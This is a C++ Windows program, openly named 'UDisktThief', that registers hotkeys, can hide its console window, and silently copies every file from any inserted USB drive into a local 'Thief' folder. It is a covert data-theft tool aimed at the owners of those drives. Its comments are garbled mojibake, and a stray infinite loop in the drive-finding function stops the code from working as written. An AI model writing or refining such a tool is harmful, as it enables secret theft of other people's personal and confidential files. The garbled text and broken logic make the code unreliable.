#include<Windows.h>
#include<DbgHelp.h>
#include<iostream>
#include<queue>
#include<thread>
#include<mutex>
#include<atomic>
using namespace std;
#pragma comment(lib,"Dbghelp.lib")
//����洢�����ļ���Ŀ�ĵ��ļ��ṹ��
struct DString
{
	string oldFile;
	string newFile;
	DString(const string& _oldFile, const string& _newFile) {
		oldFile = _oldFile;
		newFile = _newFile;
	}
};
bool isShow = false;
queue<DString> g_qFile; //�ļ���Ϣ����
mutex g_qMutex; //���л�����
mutex g_outMutex; //���������
int g_numofThread = 5; //���������ļ����߳���
HANDLE* hThread = new HANDLE[g_numofThread];
atomic<int> g_exitThread; //��¼�˳����߳�����
string g_savePath = "D:\\Y7000P\\Thief"; //�����ļ���·��
ULONGLONG g_SpendTime;//��¼�������ܹ�����ʱ��

bool g_bExit = false; //���������ļ����߳��Ƿ��˳�
//ע��ȫ���ȼ�
bool RegisterGlobalKey();
//ɾ��ȫ�ֿ�ݼ�
void UnRegistreGlobalKey();
//��U��
vector<string> FindDriver();
//������Ϣ
bool DealMsg(WPARAM wParam);
//���������ļ�
void FindAllFile(string savePath, string dir);
//�����ļ����߳�
unsigned _stdcall ThrToCopy(void*);
//�����ļ����߳�
unsigned __stdcall ThrToSearch(void* param);

int main() {
	//�����ں˶���,��ֹ�࿪
	CreateMutex(NULL, TRUE, L"DBF4E165-EE50-47D9-B2D6-ADA8C0B05887");
	// GetLastError() ��ȡ������
	if (GetLastError() == ERROR_ALREADY_EXISTS) return -1;
	UnRegistreGlobalKey(); //ע��ȫ�ֿ�ݼ�,��ֹ����Ӧ��ռ��
	bool ret = RegisterGlobalKey();//ע��ȫ�ֿ��ݼ�
	if (!ret) return -1;
	SetConsoleTitleW(L"UDisktThief"); //���ô��ڱ���
	MSG msg{};
	while (GetMessage(&msg, NULL, 0, 0)) {	//������Ϣ
		ret = DealMsg(msg.wParam); //������Ϣ
		if (!ret) break; //false���˳�����
	}
	UnRegistreGlobalKey(); //ע��ȫ�ֿ�ݼ�
}

bool RegisterGlobalKey() {
	bool ret = RegisterHotKey(NULL, 'l', MOD_CONTROL, VK_CONTROL); //����Ctrl��������
	if (!ret) return ret;
	ret = RegisterHotKey(NULL, 'q', MOD_CONTROL, 'Q'); //Ctrl+Q �˳�����
	if (!ret) return ret;
	ret = RegisterHotKey(NULL, 's', MOD_ALT, 'Z'); //alt+Z ��ʾ�����ش���
	if (!ret) return ret;
	return ret;
}
void UnRegistreGlobalKey() {
	UnregisterHotKey(NULL, 'l');
	UnregisterHotKey(NULL, 'q');
	UnregisterHotKey(NULL, 's');
}
vector<string> FindDriver() {
	int len = GetLogicalDriveStringsA(0, 0);
	std::string dri;
	dri.resize(len);
	GetLogicalDriveStringsA(len, (LPSTR)dri.c_str());
	vector<string> uDrive;
	std::cout << dri << std::endl;
	while (true);
	for (int i = 0; i < len - 1; i++) {
		if (dri[i] == '\0' && dri[i + 1] == '\0') break; //����β,�˳�
		if (dri[i] != '\0') continue; //��Ϊ�̷����ֽ�,������һ��ѭ��
		i += 1;
		if (GetDriveTypeA(&dri[i]) == DRIVE_REMOVABLE) uDrive.push_back(&dri[i]);
	}
	return uDrive;
}
bool DealMsg(WPARAM wParam) {	//������Ϣ
	switch (wParam)
	{
	case 'l': //��ʼִ�г���
	{
		cout << "��ʼִ��!" << endl;
		vector<string> uDrive = FindDriver(); //��U��
		if (uDrive.empty()) {
			cout << "û��U��!" << endl;
			break;
		} //û����ֱ���˳�
		g_SpendTime = GetTickCount64();
		g_bExit = false; //�����߳��˳���־Ϊfalse
		for (int i = 0; i < uDrive.size(); i++) {
			char* buf = new char[4]{}; //�̷�����СΪ3�ֽ�,��\0,��4�ֽ�
			strcpy_s(buf, 4, uDrive[i].data());
			_beginthreadex(0, 0, ThrToSearch, buf, 0, 0); //���������ļ��߳�
		}
		g_exitThread = 1;
		for (int i = 0; i < g_numofThread; i++) { //����g_numofThread���߳̽��п���
			hThread[i] = (HANDLE)_beginthreadex(0, 0, ThrToCopy, 0, 0, 0);
		}
	}
	break;
	case 'q': //�˳�����
		g_bExit = true;
		Sleep(50);
		cout << "�˳�����!" << endl;
		return false;
	case 's': //��ʾ�����ؽ���
		isShow = !isShow;
		ShowWindow(GetConsoleWindow(), isShow);
		break;
	default:
		break;
	}
	return true;
}

unsigned __stdcall ThrToCopy(void*) {
	while (!g_bExit) {
		//�Ӷ�����ȡ����
		g_qMutex.lock();
		if (g_qFile.empty()) {
			g_qMutex.unlock();
			continue;
		}
		DString cf = g_qFile.front();
		g_qFile.pop();
		g_qMutex.unlock();

		g_outMutex.lock();
		cout << "����ʣ������:" << g_qFile.size() << endl;
		g_outMutex.unlock();

		BOOL ret = CopyFileA(cf.oldFile.data(), cf.newFile.data(), TRUE);//�����ļ�

		g_outMutex.lock();
		if (ret) cout << cf.oldFile << ":�������\t" << endl;
		else cout << cf.oldFile << ":����ʧ��\t" << endl;
		g_outMutex.unlock();
	}
	g_outMutex.lock();
	cout << "�����߳��˳�:" << g_exitThread++ << "/" << g_numofThread << endl;
	g_outMutex.unlock();
	return 0;
}
unsigned __stdcall ThrToSearch(void* param) {
	FindAllFile(g_savePath, (char*)param);
	delete param;
	while (!g_qFile.empty()) Sleep(1000); //��������δ�������,����
	g_bExit = true; //�˳������ļ����߳�
	WaitForMultipleObjects(g_numofThread, hThread, TRUE, INFINITE);

	g_SpendTime = GetTickCount64() - g_SpendTime;
	int ms = (int)g_SpendTime % 1000; //����
	g_SpendTime /= 1000;
	int sec = (int)g_SpendTime % 60; //��
	g_SpendTime /= 60;
	int minutes = (int)g_SpendTime % 60; //����
	int hours = (int)g_SpendTime / 60; //Сʱ

	g_outMutex.lock();
	cout << "��ɿ���!�����߳��˳�!" << endl;
	printf("������ʱ��:%02d:%02d:%02d %03d\n", hours, minutes, sec, ms);
	g_outMutex.unlock();
	return 0;
}

void FindAllFile(string savePath, string dir) {
	if (savePath.back() == '\\') savePath.pop_back(); //ȥ������\����
	if (dir.back() == '\\') dir.pop_back(); //ȥ������\����
	MakeSureDirectoryPathExists((savePath + '\\').c_str()); //ȷ�������ļ��д���
	//�����ļ�,��ӵ�����
	WIN32_FIND_DATAA fileData{};
	HANDLE hFile = FindFirstFileA((dir + "\\*").c_str(), &fileData);
	if (hFile == INVALID_HANDLE_VALUE) return;
	do {
		if (strcmp(fileData.cFileName, ".") == 0 || strcmp(fileData.cFileName, "..") == 0) continue;
		if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { //���ΪĿ¼,���еݹ�
			FindAllFile((savePath + '\\' + fileData.cFileName).data(), (dir + '\\' + fileData.cFileName).data());
			continue;
		}
		//�ҵ��ļ�,��ӵ�����
		g_qMutex.lock();
		g_qFile.push(DString(dir + "\\" + fileData.cFileName, savePath + "\\" + fileData.cFileName));
		g_qMutex.unlock();
		//�����Ӧ��Ϣ
		g_outMutex.lock();
		cout << "��ǰ��������:" << g_qFile.size() << endl;
		g_outMutex.unlock();
	} while (FindNextFileA(hFile, &fileData));
	FindClose(hFile);
}